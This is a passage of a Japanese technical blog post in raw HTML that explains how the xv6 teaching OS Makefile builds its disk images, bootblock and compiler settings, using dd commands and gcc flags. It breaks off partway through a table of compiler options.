&lt;h3 id=&quot;xv6img&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#xv6img&quot; aria-label=&quot;xv6img permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;xv6.img&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;は、以下のような構造です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Makefile&lt;/span&gt;
xv6.img: bootblock kernel
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;bootblock &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;conv&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;notrunc
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;kernel &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;seek&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;conv&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;notrunc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;dd if=/dev/zero of=xv6.img count=10000&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;512*10^4&lt;/code&gt;バイト(51.2MBバイト)を&lt;code class=&quot;language-text&quot;&gt;/dev/zero&lt;/code&gt;から読みだして&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;として保存します。&lt;/p&gt;
&lt;p&gt;ddコマンドのブロックサイズ(&lt;code class=&quot;language-text&quot;&gt;bs&lt;/code&gt;)はデフォルトで512であるため、このような挙動になります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;conv=notrunc&lt;/code&gt;は、元のファイルのサイズを維持したまま、指定したバイナリの書き込みを行うオプションです。&lt;/p&gt;
&lt;p&gt;これによって、512バイトのbootblock が、&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;の先頭から書き込まれた際に、元の&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;のサイズが維持されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;seek=1&lt;/code&gt;は、ブロック単位で書き込み開始位置をスキップするオプションです。&lt;/p&gt;
&lt;p&gt;ブロックサイズはデフォルトでは512であるため、&lt;code class=&quot;language-text&quot;&gt;dd if=kernel of=xv6.img seek=1 conv=notrunc&lt;/code&gt;は、先頭512バイト目からkernelを配置することを意味しています。&lt;/p&gt;
&lt;p&gt;これらのコマンドを見てわかる通り、&lt;code class=&quot;language-text&quot;&gt;512*10^4&lt;/code&gt;バイト(51.2MBバイト)の空のイメージファイルを生成した後、先頭512バイトにbootblockを配置し、さらにその後にkernelを配置しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAABiElEQVQ4y8WU6XaCMBBGff8Hah+gdtGiApGqaCsgFgmgHDZ3viZxpaL1X3POPWFmwiXDVsF+bLdbRFFUII5jJEki4Me/65vNRpyb5/lBg0oQ+IjY4vVqhW9KQcwRNMsWEMNCo9dHUx+ADM1Tnq2xnAm2ZcLlcon1es12uIE9cVHTh3gfGJAGJl47AzxUa3h8qeNZ0yF9mixviDXDsYOcdXUhxNlwPAeNLxmyQRiqmMlIEygmQWufaw5lGI5ZLuTBIeGHFF0qo+8T6B5HFce7WN3nCHqeAtszWcsn4YGC0Ju5+JjI6LkEXVdlEKijBhRLOsacjsuEtCgstHwhpDshn+t6FW/dp13MZL0rwuMOC8LQFYt1ry1knL6vCQ4xr3WpgrFnYZ4tQKmLsW0jCKbgD7ggpNMJa1GCNm6hfaS5ZxfzGrElWK7BdpjfbjlOYqTzBOkiZSTlsHrG6mE4E6/bzZazbI57B/96zoWlO8yyrHC1a4hu+Nf1L8J7x13CNE3FveHzX1z72/wARuV7fAc3xmkAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/8ac56/image-8.webp 240w,
/static/0ee723f0df4390ef428db10febeb6cfd/d3be9/image-8.webp 480w,
/static/0ee723f0df4390ef428db10febeb6cfd/b0a15/image-8.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/8ff5a/image-8.png 240w,
/static/0ee723f0df4390ef428db10febeb6cfd/e85cb/image-8.png 480w,
/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0ee723f0df4390ef428db10febeb6cfd/0b533/image-8.png&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;空になったままのスペースはシステムが使用します。&lt;/p&gt;
&lt;h3 id=&quot;fsimg&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#fsimg&quot; aria-label=&quot;fsimg permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;fs.img&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;fs.img&lt;/code&gt;は以下のような構造です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Makefile&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;UPROGS&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_cat&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_echo&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_forktest&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_grep&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_init&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_kill&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_ln&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_ls&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_mkdir&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_rm&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_sh&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_stressfs&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_usertests&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_wc&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	_zombie&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;

mkfs: mkfs.c fs.h
	gcc -Werror -Wall -o &lt;span class=&quot;token function&quot;&gt;mkfs&lt;/span&gt; mkfs.c

fs.img: &lt;span class=&quot;token function&quot;&gt;mkfs&lt;/span&gt; README &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;UPROGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
	./mkfs fs.img README &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;UPROGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;各種コマンドプログラムの本体やREADMEが格納されています。&lt;/p&gt;
&lt;p&gt;ユーザが操作するディスクです。&lt;/p&gt;
&lt;h2 id=&quot;bootblockを読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bootblock%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;bootblockを読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;bootblockを読む&lt;/h2&gt;
&lt;p&gt;まずはbootblockについてです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;bootblock: bootasm.S bootmain.c
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;CC&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;CFLAGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -fno-pic -O -nostdinc -I. -c bootmain.c
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;CC&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;CFLAGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -fno-pic -nostdinc -I. -c bootasm.S
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;LD&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;LDFLAGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -N -e start -Ttext 0x7C00 -o bootblock.o bootasm.o bootmain.o
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJDUMP&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -S bootblock.o &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; bootblock.asm
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJCOPY&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -S -O binary -j .text bootblock.o bootblock
	./sign.pl bootblock&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ビルドオプションから見ていきます。&lt;/p&gt;
&lt;h3 id=&quot;コンパイラ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9&quot; aria-label=&quot;コンパイラ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;コンパイラ&lt;/h3&gt;
&lt;p&gt;以下は、Makefileの中の&lt;code class=&quot;language-text&quot;&gt;$(CC)&lt;/code&gt;に関連した箇所です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Cross-compiling (e.g., on Mac OS X)&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# TOOLPREFIX = i386-jos-elf&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Using native tools (e.g., on X86 Linux)&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#TOOLPREFIX = &lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Try to infer the correct TOOLPREFIX if not set&lt;/span&gt;
ifndef TOOLPREFIX
TOOLPREFIX :&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;shell &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; i386-jos-elf-objdump -i &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;^elf32-i386$$&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/dev/null &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;i386-jos-elf-&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;elif&lt;/span&gt; objdump -i &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;elf32-i386&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/dev/null &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;***&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** Error: Couldn&apos;t find an i386-*-elf version of GCC/binutils.&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** Is the directory with i386-jos-elf-gcc in your PATH?&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** If your i386-*-elf toolchain is installed with a command&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** prefix other than &apos;i386-jos-elf-&apos;, set your TOOLPREFIX&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** environment variable to that prefix and run &apos;make&apos; again.&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;*** To turn off this error, run &apos;gmake TOOLPREFIX= ...&apos;.&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
	&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;***&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;fi&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
endif

CC &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;TOOLPREFIX&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;gcc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;デフォルトでは&lt;code class=&quot;language-text&quot;&gt;gcc&lt;/code&gt;を使ってコンパイルします。&lt;/p&gt;
&lt;p&gt;もしLinuxではなくMacOSなどの環境でビルドする場合は、&lt;code class=&quot;language-text&quot;&gt;TOOLPREFIX&lt;/code&gt;の設定を変更してクロスコンパイルする必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/maru-n@github/items/9cf83944403b3fbb8422&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OS X Yosemiteでxv6をbuildして動かすまで - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;続いて、以下は&lt;code class=&quot;language-text&quot;&gt;CFLAGS&lt;/code&gt;の箇所です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;CFLAGS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; -fno-pic -static -fno-builtin -fno-strict-aliasing -O2 -Wall -MD -ggdb -m32 -Werror -fno-omit-frame-pointer
CFLAGS &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;shell &lt;span class=&quot;token punctuation&quot;&gt;$(&lt;/span&gt;CC&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; -fno-stack-protector -E -x c /dev/null &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/dev/null &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; -fno-stack-protector&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;オプションの部分については割愛しますが、デフォルトの設定を追っていきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/GNU_gcc/man1/gcc.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of GCC&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;オプション&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-fno-pic&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;位置独立なコード(PIC)を生成しない&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-static&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;プログラムを静的リンクでコンパイルする&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-fno-builtin&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;コンパイラに組み込まれているビルドイン関数を利用しない&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;-fno-strict-aliasing&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;厳密なエイリアシングの無効化&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
